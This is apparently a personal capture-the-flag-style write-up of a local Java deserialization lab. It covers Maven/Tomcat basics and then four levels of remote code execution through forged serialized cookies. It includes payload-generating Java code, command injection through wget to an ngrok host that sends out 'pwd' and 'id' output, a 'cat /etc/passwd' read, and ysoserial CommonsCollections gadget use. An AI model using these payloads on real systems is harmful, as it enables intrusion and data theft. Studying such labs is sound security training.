@@ -1,0 +1,634 @@
+[Part 1: Before we start]
+
+    - So if you are new to Java web development and don't know where to start, don't worry
+    
+    - Now open the /debug-java-web and analyze each part with me
+
+            bigbox@ubuntu:~/Writeup/cyberjutsu/.../debug-java-web$ tree
+            .
+            ├── pom.xml
+            ├── src
+            │   └── main
+            │       ├── java
+            │       │   └── com
+            │       │       └── example
+            │       │           ├── GoodbyeServlet.java
+            │       │           └── HelloServlet.java
+            │       └── webapp
+            │           ├── hello.txt
+            │           ├── index.jsp
+            │           └── WEB-INF
+            │               └── web.xml
+            └── target
+                ├── classes
+                │   └── com
+                │       └── example
+                │           ├── GoodbyeServlet.class
+                │           └── HelloServlet.class
+                ├── generated-sources
+                │   └── annotations
+                ├── generated-test-sources
+                │   └── test-annotations
+                └── test-classes
+
+    [*] /pom.xml
+
+        [+] Basically pom.xml is just a configuration file that contains information about project dependencies, settings, and packaging 
+            
+            (Maven uses this information to build and deploy the project)
+
+    // [?] What is Maven, you may wonder? It is just software that helps you easier to manage dependencies, and automate the build process.
+
+                ...
+                <groupId>com.example</groupId>
+                <artifactId>debug-java-web</artifactId>
+                <version>1.0-SNAPSHOT</version> 
+
+    // [?] Specifies the version number of the project
+                
+                <name>debug-java-web</name> 
+                <packaging>war</packaging>
+
+    // [?] Specifies the type of packaging used for the project. 
+           In this case, it is set to "war", which stands for Web ARchive. This packaging is used for Java web applications.
+                
+                ...
+                <dependency>
+                    <groupId>javax.servlet</groupId>
+                    <artifactId>javax.servlet-api</artifactId>
+                    <version>3.1.0</version>
+                    <scope>provided</scope>
+                </dependency>
+                ...
+
+            => root@f66b048b7d39:/home/cbjs# ls
+
+                apache-maven-3.6.3
+                ...
+                debug-java-web-1.0-SNAPSHOT.war
+                ...
+                apache-tomcat-8.5.35
+                debug-java-web
+                ...
+                jdk1.8.0_131
+
+    [*] /src/main/java/com/example
+
+        - Before deep dive into this, you should look at the first line of the GoodbyeServlet.java
+
+            package com.example;
+            ...
+
+        => This line at the beginning of a Java file is used to define the package to which that particular Java file belongs. 
+           This package declaration is independent of the directory structure. However, Java does not enforce this relationship
+
+        - According to CodeGPT this is how we should understand this kind of hierarchy
+
+                src: contains the source code and resources of your project.
+
+                main: represents the main source folder of your project.
+
+                java: contains the Java source code files
+
+                com: represents the package structure of your project.
+
+                example: represents the subpackage structure within the com package.
+
+    [*] /webapp 
+        
+        - This directory contains the web application's static resources, such as HTML, CSS, and JavaScript files
+
+        - And you can see index.jsp right? it is nothing special. Just think about index.php, they are the same
+
+    [*] /WEB-INF/web.xml
+
+        - This file is the web application's deployment descriptor, which describes the application's servlets, filters, and other components.
+
+                <display-name>My App</display-name>
+
+    // [?] <display-name> element specifies the display name of the web application
+
+                <servlet>
+
+    // [?] Servlet is a Java class that extends the HttpServlet class. Servlets are used to extend the functionality of a web server. 
+           They can be used to handle HTTP requests, generate dynamic content, and interact with databases.
+    
+                    <servlet-name>goodbye</servlet-name>
+                    <servlet-class>com.example.GoodbyeServlet</servlet-class>
+                </servlet>
+
+                <servlet-mapping>
+
+    // [?] The <servlet-mapping> element specifies a mapping between a servlet and a URL pattern
+
+                    <servlet-name>goodbye</servlet-name>
+                    <url-pattern>/goodbye</url-pattern>
+                </servlet-mapping>
+                </web-app>
+
+            => From this code you can understand that when a user requests the URL /goodbye, the Tomcat web server will invoke the GoodbyeServlet class. 
+                
+               (The GoodbyeServlet class can then handle the request and generate a response)
+
+    [*] /target
+
+        - The /target directory is used to store the compiled files for a Java web application. 
+
+        - When you build a Java web, the Maven build process will compile the source code and generate the class files 
+          
+          (The class files will be stored in the /target directory)
+
+        - The /target directory is not directly accessible to the web. The web server will only serve files that are located in the /webapp directory.
+
+   [Fact] Tomcat is a Java-based web server that can be used to host Java web applications, just like the relationship between PHP and Apache2
+           catalina.sh typically refers to the startup script for Apache Tomcat, which is an open-source Java Servlet Container developed by the Apache Software Foundation
+
+    [*] Okay, so if you are wondering where the maven, tomcat, and tons of war files in the container came from, focus on the docker-compose.yml
+
+        version: "3.0"
+        services:
+        deserialize:
+            image: cyberjutsu/java-deserialization-lab-local:1.3
+
+    // [?] "image" will pull java-deserialization-lab-local tag 1.3 from https://hub.docker.com/r/cyberjutsu/java-deserialization-lab-local/tags (about 900 MB)
+           the thing you downloaded contains 32 layers and runs a lot of setup commands (you can see details in the Images on the Docker Desktop)
+
+            container_name: java_deserialize
+            volumes:
+            - "./src/java_deserialization:/home/cbjs/java_deserialization"
+            - "./src/debug-java-web:/home/cbjs/debug-java-web"
+            - "./logs:/home/cbjs/apache-tomcat-8.5.35/logs"
+            ...
+
+        - Backend stuff will be deployed in the /home/cbjs/apache-tomcat-8.5.35/webapps, just think about /var/www/html, they are kind da same
+          However, they can run because of class and dependencies stuff in the apache-maven-3.6.3, so each time you fix the source, remember to clean mvn file and restart
+
+        => Luckily, CBJS already coded for us the build.sh, which can automatically clean and restart the lab for us
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Part 2: Java Deserialization Attack] 
+
+[Level 1]
+
+[*] Target: http://localhost:13337/java-deserialize-lv1-1.0-SNAPSHOT/
+
+    - Now! Before solving this lab we gonna look at the source a little bit
+
+        [-] HelloServlet.java:
+
+                package com.example.javadeserialize; // [?] Since all the java file are stored in the /java/com/example/javadeserialize,
+                                                            => We can easily access the Admin and User classes
+                ...
+                @WebServlet(name = "helloServlet", value = "/hello-servlet")
+            /* 
+                [?] @WebServlet is used to define the URL pattern(s) to which the servlet will respond. In this case, the servlet is mapped to the "/hello-servlet" URL.
+
+                => When a client makes an HTTP request to the "/hello-servlet" URL, the servlet's doGet or doPost method 
+            */
+                public class HelloServlet extends HttpServlet {
+
+                    public String serializeToBase64(Serializable obj) throws IOException {
+                        ByteArrayOutputStream output = new ByteArrayOutputStream(); 
+                    
+                    // [?] Just turn "ouput" object into a byte array for oos stream blow passing serialized stuff into it
+                    
+                        ObjectOutputStream oos = new ObjectOutputStream(output);
+                        oos.writeObject(obj); // [?] This is truly where the data of the object is serialized
+                        oos.close();
+                        return Base64.getEncoder().encodeToString(output.toByteArray()); 
+                        
+                    // [?] it base64 encode the serialized object to make things easier to transport
+                    }
+
+                    private static Object deserializeFromBase64(String s) throws IOException, ClassNotFoundException {
+                        byte[] data = Base64.getDecoder().decode(s); // told ya (^.^!)
+                        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
+                        Object o  = ois.readObject(); // [?] Exactly! deserialization happened in this line
+                        ois.close();
+                        return o;
+                    }
+
+                    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
+                        try {
+                            response.setContentType("text/html");
+                            PrintWriter out = response.getWriter();
+                            Map<String, String> cookieMap = Arrays.stream(request.getCookies()).collect(Collectors.toMap(Cookie::getName, Cookie::getValue));
+                            
+                            // [?] user's cookie is collected and stored as cookieMap
+                            
+                            User user;
+                            if (!cookieMap.containsKey("user")) {
+                                user = new User();
+                                Cookie cookie = new Cookie("user", serializeToBase64(user));
+                                response.addCookie(cookie);
+                            } else {
+                                try {
+                                    user = (User)deserializeFromBase64(cookieMap.get("user")); // [?] Learn C and you know what (User) means
+                                } catch (Exception e) {
+                                    out.println("Please don't hack me");
+                                    e.printStackTrace();
+                                    return;
+                                }
+                            }
+                            out.println("<html><body>");
+                            out.println("<h1>Level 1 Hello " + user + "</h1>");
+                            out.println("</body></html>");
+                    ...
+                    }
+                }}
+
+        [-] User.java: Nothing special here! I gonna skip this
+
+        [-] Admin.java:
+
+                ...
+                public class Admin extends User {
+                    private String getNameCMD;
+                    public Admin() {
+                        this.getNameCMD = "whoami";
+                    }
+
+                    @Override
+                    public String toString() { 
+                    
+                    // [?] Hehe! RCE time. Remind if you forgot out.println("<h1>Level 1 Hello " + user + "</h1>") in the HelloServlet.java
+                    
+                        try {
+                            Process proc = Runtime.getRuntime().exec(this.getNameCMD); // [?] execute "whoami"
+                            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+                            return stdInput.readLine();
+                        } catch (IOException e) {
+                            return "";
+                        }
+                    }}
+
+    - There is a lab called "exploit tool", I gonna use it to generate payloads since the serialize chain is impossible to write to me
+
+    - Yeahhhh! I know, I know, you might think what the hack is this tool, and so do I. However, after looking at this code I realized that
+      this tool (or none-sense lab) is just a place for us to execute java stuff because things here are much harder to run than php 
+      (Thank CBJS, but please take note of that)
+
+    - After copying all java files in lv1 and pasting those to the empty lab, I fixed a little bit to print out the serialized payload
+    
+        [-] HelloServlet.java:
+
+            ...
+            public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
+                try {
+                    response.setContentType("text/html");
+                    PrintWriter out = response.getWriter();
+                    Map<String, String> cookieMap = Arrays.stream(request.getCookies()).collect(Collectors.toMap(Cookie::getName, Cookie::getValue));
+                    User user = new Admin(); // [?] Why not! Admin just are extended fron User right 
+                    out.println("<html><body>");
+                    out.println("<h1>Payload: " + serializeToBase64(user) + "</h1>"); // print out the serialized payload
+                    out.println("</body></html>");
+                } ... }
+
+        [-] Admin.java:
+
+            ... 
+            public class Admin extends User {
+                private String getNameCMD;
+                public Admin() {
+                    this.getNameCMD = "cat /etc/passwd";
+                } ... }
+
+    - Now! clean the mvn and restart the lab
+
+    [!] http://localhost:13337/deserialize-exploit-1.0-SNAPSHOT/hello-servlet => Payload: rO0ABXNy...9wYXNzd2Q=
+
+    [>>] Replace the User's cookie in http://localhost:13337/java-deserialize-lv1-1.0-SNAPSHOT/hello-servlet with the payload I just generated
+
+    [Final Result: RCE] Level 1 Hello root:x:0:0:root:/root:/bin/bash
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 2]
+
+[*] Target: http://localhost:13337/java-deserialize-lv2-1.0-SNAPSHOT/
+
+    - The source code in this level is a little bit longer than the previous one. However, we only need to focus on the main part
+
+    - The first step for RCE is to find the function that can execute the command you sent especially in object injection
+
+        [-] MyHTTPClient.java (I know you can easily find it):
+
+                ...
+                public class MyHTTPClient extends HTTPConnection {
+                    private String host;
+
+                    public MyHTTPClient(String host)  {
+                        super("http://" + host); 
+                        this.host = host;
+                    }
+
+                    public void sendRequest() {
+                        String path = "/bin/bash";
+                        ProcessBuilder pb = new ProcessBuilder(path, "-c", "curl " + this.host); 
+                        try {
+                            Process curlProcess = pb.start();
+                        } catch (IOException e) {
+                            e.printStackTrace();
+                        }
+                    }
+
+                // [?] Nah! It just executes stuff with a little error handling
+
+                    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException, InterruptedException {
+                        in.defaultReadObject();
+                        String path = "/bin/bash";
+                        ProcessBuilder pb = new ProcessBuilder(path, "-c", "ping " + this.host);
+                        Process ping = pb.start();
+                        int exitCode = ping.waitFor();
+                    }
+                }
+
+    - So now! The main question is "What is the relationship between these classes ?"
+
+        [+] With the sendRequest(), you can only find it in the MyRequestServlet.java which is used for a disabled feature
+
+            => Because of that we gonna skip this one
+
+        [+] However, with readObject(), you can find something much more interesting in the HelloServlet.java
+            
+            ...  
+            public Object deserializeFromBase64(String s) throws IOException, ClassNotFoundException {
+                byte[] data = Base64.getDecoder().decode(s);
+                ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
+                Object o  = ois.readObject(); // [?] That's what I'm talking about (^.^!)
+                ois.close();
+                return o;
+            }
+
+            public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
+                try {
+                    response.setContentType("text/html");
+                    PrintWriter out = response.getWriter();
+                    Map<String, String> cookieMap = Arrays.stream(request.getCookies()).collect(Collectors.toMap(Cookie::getName, Cookie::getValue));
+                    User user; // [?] Redirect user to MyHTTPClient and then we can have our payload 
+                    if (!cookieMap.containsKey("user")) {
+                        user = new User("guest");
+                        Cookie cookie = new Cookie("user", serializeToBase64(user));
+                        response.addCookie(cookie);
+                    } else {
+                        try {
+                            user = (User)deserializeFromBase64(cookieMap.get("user")); // [?] This line is where our payload is processed and execute
+                        } catch (Exception e) {
+                            out.println("Please don't hack me");
+                            e.printStackTrace();
+                            return;
+                        }
+                    } ... } ... }
+
+    [!] If you are Hawkeye then you know what happens next right ? Since (User)deserializeFromBase64(cookieMap.get("user")) (~.~!) 
+    
+        => It still prints out "Please don't hack me"
+
+        BUT! deserializeFromBase64() still be run right, which means readObject() is still activated and the commands we set are able to execute
+        
+    - But how can we RCE this since there's only ping command, now you need to remember the trick I used in the final levels of the CMD injection lab
+
+    [?] Remember this
+
+            (base) bigbox@ubuntu:~/Desktop$ curl http://192.168.27.254:1234/$("whoami")
+            <!DOCTYPE HTML>
+            <html lang="en">
+                <head>
+                    <meta charset="utf-8">
+                    <title>Error response</title>
+                </head>
+                <body>
+                    <h1>Error response</h1>
+                    <p>Error code: 404</p>
+                    <p>Message: File not found.</p>
+                    <p>Error code explanation: 404 - Nothing matches the given URI.</p>
+                </body>
+            </html> 
+
+            => (base) bigbox@ubuntu:~/Desktop$ python3 -m http.server 1234
+                Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+                192.168.27.254 - - [29/Dec/2023 13:34:26] code 404, message File not found
+                192.168.27.254 - - [29/Dec/2023 13:34:26] "GET /bigbox HTTP/1.1" 404 
+
+    [Note] This is Thinh from the future! This lab hasn't installed curl! USE WGET
+
+    - This is my fixed HelloServlet.java which was born to print out the payload
+            
+            ...
+            public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
+                try {
+                    response.setContentType("text/html");
+                    PrintWriter out = response.getWriter();
+                    MyHTTPClient user = new MyHTTPClient("-h ; wget https://{my ngrok's domain name}/$(pwd | base64)");
+                    out.println("<html><body>");
+                    out.println("<h1>" + serializeToBase64(user) + "</h1>");
+                    out.println("</body></html>");
+                } catch (Exception e) {
+                    response.setContentType("text/html");
+                    PrintWriter out = response.getWriter();
+                    out.println("Something went wrong");
+                    return;
+                }
+            } ...
+
+        => rO0ABXNyAChjb20u...ZWUuYXBwLyQoaWQp
+
+    - Reload the webpage with the cookie and you will have this
+
+            Session Status                online                                                                                                          
+            Account                       hungthinhtran.office@gmail.com (Plan: Free)                                                                     
+            ...                                                                                                         
+            Web Interface                 http://127.0.0.1:4040                                                                                           
+            Forwarding                    https://5ce2-2401-d800-d36c-b679-c652-5dbc-3890-af21.ngrok-free.app -> http://localhost:1234                    
+                                                                                                                                                        
+            Connections                   ttl     opn     rt1     rt5     p50     p90                                                                     
+                                          1       0       0.00    0.00    0.08    0.08                                                                    
+                                                                                                                                                        
+            HTTP Requests                                                                                                                                 
+            -------------                                                                                                                                 
+                                                                                                                                                        
+            GET /Lwo=                   502 Bad Gateway                                                                                            
+                                                
+    [Final Result: RCE] "Lwo=" <=> "/" 
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 3]
+
+[*] Target: http://localhost:13337/java-deserialize-lv3-1.0-SNAPSHOT/
+
+    - Yeahhhh! This lab isn't that hard right (^.^?) 
+      If you can solve the previous level, I think that you can easily solve this one
+
+    - Let's see! What do we have here
+
+    [-] MyHTTPClient.java:
+
+            ...
+            public void sendRequest() { // [?] Useless (~.~!)
+                String path = "/bin/bash";
+                ProcessBuilder pb = new ProcessBuilder(path, "-c", "curl " + this.host);
+                try {
+                    Process curlProcess = pb.start();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+            }
+
+            @Override
+            public void connect() throws IOException, InterruptedException { // [?] This might be the chosen one  
+                String path = "/bin/bash";
+                ProcessBuilder pb = new ProcessBuilder(path, "-c", "ping " + this.host);
+                Process ping = pb.start();
+                int exitCode = ping.waitFor();
+            }
+            ...
+
+    [-] TestConnection.java:
+
+            ...
+            public class TestConnection implements Serializable {
+                public HTTPConnection connection;
+                public TestConnection(HTTPConnection connection) {
+                    this.connection = connection;
+                }
+                private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException, InterruptedException {
+
+                // [?] readObject() ? Sound familiar to us! Hehe boy
+
+                    in.defaultReadObject();
+                    this.connection.connect(); // [?] Told you so (^.^*)
+                }
+            }
+
+    - Because every "HelloServlet.java" files are the same, just need to fix a little bit and things gonna work smoothly
+
+            ...
+            public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
+                try {
+                    response.setContentType("text/html");
+                    PrintWriter out = response.getWriter();
+
+                    MyHTTPClient user = new MyHTTPClient("; wget https://{my ngrok's domain name}/$(id | base64)");
+                    TestConnection payload = new TestConnection(user);
+
+                    out.println("<html><body>");
+                    out.println("<h1>" + serializeToBase64(payload) + "</h1>");
+                    out.println("</body></html>");
+                } ... } 
+
+    - Clean mvn and restart the lab then you get your payload: rO0ABXNyACpjb20...C8kKGlkIHwgYmFzZTY0KQ==
+
+    - Final step, enjoy the taste of the victories
+
+            Session Status                online                                                                        
+            Account                       hungthinhtran.office@gmail.com (Plan: Free)                                   
+            ...                                                                        
+            Web Interface                 http://127.0.0.1:4040                                                         
+            Forwarding                    https://cc0b-2401-d800-41-17dd-5486-c1a0-c31c-d5aa.ngrok-free.app -> http://lo
+                                                                                                                        
+            Connections                   ttl     opn     rt1     rt5     p50     p90                                   
+                                          1       0       0.00    0.00    0.09    0.09                                  
+                                                                                                                        
+            HTTP Requests                                                                                               
+            -------------                                                                                               
+                                                                                                                        
+            GET /dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkK 502 Bad Gateway
+
+    [Final result: RCE] dWlkPTAoc...dXBzPTAocm9vdCkK <=> uid=0(root) gid=0(root) groups=0(root)
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 4]
+
+[*] Target: http://localhost:13337/java-deserialize-lv4-1.0-SNAPSHOT/
+ 
+    - This level is a real monster! I spent 2 weeks on this but I couldn't solve it in the white box way
+
+    - However! In the way of "Black Box and Tools" or you can call it "The Dark Side of the Force", I can say that I can RCE this level
+
+    - Now look at the Images in Docker Desktop (the cyberjutsu/java-deserialization), you can see there are 32 layers
+
+        => Docker is powerful since it shows us all CVE realted to each layer
+    
+    - And in the 23rd layer:  "RUN /bin/sh -c cd /home/cbjs/java_deserialization/deserialize-lv4 && /home/cbjs/..."
+
+        => Package: commons-collections/commons-collections 3.1
+
+           [+] CVE-2015-7501⁠ which has a really high score of 9.8
+
+           [+] CVE-2015-6420 which is just a high (still cool but not impressive)
+
+        [Note] Now I know that this lab have a great vulnerability in some classes of the dependency commons-collections 3.1
+
+            [-] pom.xml:
+
+                ...
+                <dependency>
+                    <groupId>commons-collections</groupId>
+                    <artifactId>commons-collections</artifactId>
+                    <version>3.1</version>
+                </dependency>
+                ...
+    
+    - Since I know the CVE, let's search for the POC
+
+        => https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/JBoss%20CVE-2015-7501.py
+
+        [!] But! while I was reading the source code of the POC I saw this
+
+                ...
+                ysoserial_default_paths = ['./ysoserial.jar', '../ysoserial.jar']
+                ysoserial_path = None
+                ...
+
+            => Which means I should download this file in order to use the POC
+
+            => The keyword "ysoserial.jar" led me to https://github.com/frohoff/ysoserial
+
+            => In the Installation part you can find the link to download ysoserial-all.jar
+
+    - Cool they also give us the usage
+
+        Usage: java -jar ysoserial-all.jar [payload] '[command]'
+        Available payload types:
+        Payload             Authors                     Dependencies
+        -------             -------                     ------------
+        ...
+        CommonsCollections1 @frohoff                    commons-collections:3.1
+        ...
+        CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1
+        CommonsCollections6 @matthias_kaiser            commons-collections:3.1
+
+    [!] In my main machine doesn't have maven yet, you can download ysoserial-all.jar in docker's container
+
+        $root@4050ac254c41:/home/cbjs/exploit# java -jar ysoserial-all.jar CommonsCollections7 "wget https://{my_ngrok}/$(id)" | base64 -w 0
+
+                                               => rO0ABXNyABNqYX...AfgAveHhzcQB+AC0AAAACeA==
+
+    - Now, change the user's cookie and reload the webpage
+
+        Account                       hungthinhtran.office@gmail.com (Plan: Free)                                                                                                                   
+        Update                        update available (version 3.5.0, Ctrl-U to update)                                                                                                            
+        ...                                                                                                                                                        
+        Web Interface                 http://127.0.0.1:4040                                                                                                                                         
+        Forwarding                    https://a67d-2401-d800-41-17dd-178b-18dc-14ff-3361.ngrok-free.app -> http://localhost:1234                                                                    
+                                                                                                                                                                                                    
+        Connections                   ttl     opn     rt1     rt5     p50     p90                                                                                                                   
+                                      2       0       0.00    0.00    0.05    0.09                                                                                                                  
+                                                                                                                                                                                                    
+        HTTP Requests                                                                                                                                                                               
+        -------------                                                                                                                                                                               
+                                                                                                                                                                                                    
+        GET /uid=0(root)               502 Bad Gateway 
+
+    [Final result: RCE] GET /uid=0(root)
